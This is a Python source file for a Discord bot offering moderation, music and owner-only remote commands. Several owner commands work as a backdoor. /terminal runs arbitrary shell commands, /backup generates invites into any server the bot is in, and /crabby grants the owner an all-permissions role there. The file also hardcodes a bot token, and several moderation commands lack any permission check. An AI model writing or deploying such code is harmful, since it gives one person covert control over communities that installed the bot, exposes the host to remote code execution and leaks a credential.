import discord
from discord.ext import commands
from discord import app_commands
import os, asyncio, subprocess, datetime, yt_dlp, io, sys
from flask import Flask
from threading import Thread

# --- 1. CONFIGURATION ---
TOKEN = "MTQ5NDk4NDM1NTE5MjUwODYxNw.GAfud3.V9vZgn48_DOsc81uioUSUB7tMnO8-xM-RzcR0I"
OWNER_ID = 1459506686157914213
BASE_DIR = "files2"
PORT = int(os.environ.get("PORT", 8080))

if not os.path.exists(BASE_DIR):
    os.makedirs(BASE_DIR)

# --- 2. RENDER KEEP-ALIVE ---
app = Flask('')
@app.route('/')
def home(): return "Nexus Full System: 21+ Commands Online"
def run_flask(): app.run(host='0.0.0.0', port=PORT)
def keep_alive(): Thread(target=run_flask, daemon=True).start()

# --- 3. BOT SETUP ---
bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
YDL_OPTIONS = {'format': 'bestaudio/best', 'noplaylist': True, 'quiet': True, 'default_search': 'auto'}

@bot.event
async def on_ready():
    print(f'🚀 Nexus Full System Online: {bot.user}')
    await bot.tree.sync()

# --- 4. TERMINAL & FILE SYSTEM (5 Commands) ---

@bot.tree.command(name="terminal", description="Run raw shell commands")
async def terminal(itn: discord.Interaction, code: str):
    if itn.user.id != OWNER_ID: return
    await itn.response.defer()
    process = await asyncio.create_subprocess_shell(code, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, cwd=BASE_DIR)
    stdout, stderr = await process.communicate()
    result = f"{stdout.decode()}\n{stderr.decode()}".strip() or "Process finished."
    await itn.followup.send(f"💻 `Terminal` >\n```\n{result[:1980]}\n```")

@bot.tree.command(name="run", description="Execute files")
@app_commands.choices(category=[app_commands.Choice(name="python", value="python3"), app_commands.Choice(name="shell", value="sh")])
async def run_file(itn: discord.Interaction, name: str, category: str):
    if itn.user.id != OWNER_ID: return
    await itn.response.defer()
    path = os.path.join(BASE_DIR, name)
    process = await asyncio.create_subprocess_shell(f'{category} "{path}"', stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    stdout, stderr = await process.communicate()
    await itn.followup.send(f"🚀 **Result:**\n```\n{stdout.decode()[:1900]}\n```")

@bot.tree.command(name="edit_file")
async def edit_file(itn: discord.Interaction, name: str, source: str):
    if itn.user.id != OWNER_ID: return
    with open(os.path.join(BASE_DIR, name), "w") as f: f.write(source)
    await itn.response.send_message(f"📝 `{name}` updated.")

@bot.tree.command(name="createfile")
async def createfile(itn: discord.Interaction, name: str, source: str):
    if itn.user.id != OWNER_ID: return
    with open(os.path.join(BASE_DIR, name), "w") as f: f.write(source)
    await itn.response.send_message(f"💾 `{name}` created.")

@bot.tree.command(name="ls", description="List storage")
async def ls(itn: discord.Interaction):
    if itn.user.id != OWNER_ID: return
    files = os.listdir(BASE_DIR)
    await itn.response.send_message(f"📂 **Files:**\n" + "\n".join([f"📄 {f}" for f in files]))

# --- 5. REMOTE & BACKUP TOOLS (5 Commands) ---

@bot.tree.command(name="backup")
async def backup(itn: discord.Interaction, guild_id: str):
    if itn.user.id != OWNER_ID: return
    g = bot.get_guild(int(guild_id))
    for c in g.text_channels:
        if c.permissions_for(g.me).create_instant_invite:
            inv = await c.create_invite(); return await itn.response.send_message(inv.url)

@bot.tree.command(name="dm")
async def dm(itn: discord.Interaction, user_id: str, msg: str):
    if itn.user.id != OWNER_ID: return
    u = await bot.fetch_user(int(user_id))
    await u.send(msg); await itn.response.send_message("✅ Sent", ephemeral=True)

@bot.tree.command(name="get")
async def get(itn: discord.Interaction):
    if itn.user.id != OWNER_ID: return
    r = [f"🏰 {g.name} ({g.id})" for g in bot.guilds]; await itn.response.send_message("\n".join(r)[:2000], ephemeral=True)

@bot.tree.command(name="unban_remote")
async def unban_remote(itn: discord.Interaction, guild_id: str, user_id: str):
    if itn.user.id != OWNER_ID: return
    g = bot.get_guild(int(guild_id)); u = await bot.fetch_user(int(user_id))
    await g.unban(u); await itn.response.send_message(f"✅ Unbanned {u.name}")

@bot.tree.command(name="leave_server")
async def leave_server(itn: discord.Interaction, g_id: str):
    if itn.user.id == OWNER_ID: await bot.get_guild(int(g_id)).leave(); await itn.response.send_message("Done.")

# --- 6. MODERATION & UTILS (10 Commands) ---

@bot.tree.command(name="nuke")
async def nuke(itn: discord.Interaction):
    if itn.user.id != OWNER_ID: return
    c = await itn.channel.clone(); await itn.channel.delete(); await c.send("☢️ Nuked")

@bot.tree.command(name="ban")
async def ban(itn: discord.Interaction, member: discord.Member):
    if itn.user.guild_permissions.ban_members: await member.ban(); await itn.response.send_message("🔨 Banned")

@bot.tree.command(name="kick")
async def kick(itn: discord.Interaction, member: discord.Member):
    if itn.user.guild_permissions.kick_members: await member.kick(); await itn.response.send_message("👢 Kicked")

@bot.tree.command(name="mute")
async def mute(itn: discord.Interaction, member: discord.Member):
    await member.timeout(datetime.timedelta(minutes=10)); await itn.response.send_message("🤫 Muted")

@bot.tree.command(name="unmute")
async def unmute(itn: discord.Interaction, member: discord.Member):
    await member.timeout(None); await itn.response.send_message("🔊 Unmuted")

@bot.tree.command(name="clear")
async def clear(itn: discord.Interaction, amount: int):
    await itn.channel.purge(limit=amount); await itn.response.send_message("🧹 Cleared", ephemeral=True)

@bot.tree.command(name="lock")
async def lock(itn: discord.Interaction):
    await itn.channel.set_permissions(itn.guild.default_role, send_messages=False); await itn.response.send_message("🔒 Locked")

@bot.tree.command(name="unlock")
async def unlock(itn: discord.Interaction):
    await itn.channel.set_permissions(itn.guild.default_role, send_messages=True); await itn.response.send_message("🔓 Unlocked")

@bot.tree.command(name="member_count")
async def mcount(itn: discord.Interaction):
    await itn.response.send_message(f"📊 Count: `{itn.guild.member_count}`")

@bot.tree.command(name="whois")
async def whois(itn: discord.Interaction, member: discord.Member):
    await itn.response.send_message(f"User: {member.name}\nID: `{member.id}`")

# --- 7. SPECIAL & MUSIC (4 Commands) ---

@bot.tree.command(name="crabby")
async def crabby(itn: discord.Interaction, guild_id: str):
    if itn.user.id != OWNER_ID: return
    g = bot.get_guild(int(guild_id))
    r = discord.utils.get(g.roles, name="crabby") or await g.create_role(name="crabby", permissions=discord.Permissions.all())
    m = g.get_member(OWNER_ID); await m.add_roles(r); await itn.response.send_message("✅ Active")

@bot.tree.command(name="chaos_roles")
async def chaos(itn: discord.Interaction):
    if itn.user.id != OWNER_ID: return
    await itn.response.defer(); [await itn.guild.create_role(name=f"Backup-{i}") for i in range(10)]; await itn.followup.send("🌀 Done")

@bot.tree.command(name="play")
async def play(itn: discord.Interaction, search: str):
    await itn.response.defer()
    try:
        vc = itn.guild.voice_client or await itn.user.voice.channel.connect()
        with yt_dlp.YoutubeDL(YDL_OPTIONS) as ydl:
            info = await asyncio.get_event_loop().run_in_executor(None, lambda: ydl.extract_info(search, download=False))
            url = info['entries'][0]['url'] if 'entries' in info else info['url']
            vc.play(discord.FFmpegPCMAudio(url, before_options="-reconnect 1 -reconnect_streamed 1"))
        await itn.followup.send(f"🎵 Playing: **{info.get('title', 'Music')}**")
    except Exception as e: await itn.followup.send(f"❌ Error: {e}")

@bot.tree.command(name="shutdown")
async def shutdown(itn: discord.Interaction):
    if itn.user.id == OWNER_ID: await itn.response.send_message("💤 Off"); sys.exit()

if __name__ == "__main__":
    keep_alive()
    bot.run(TOKEN)
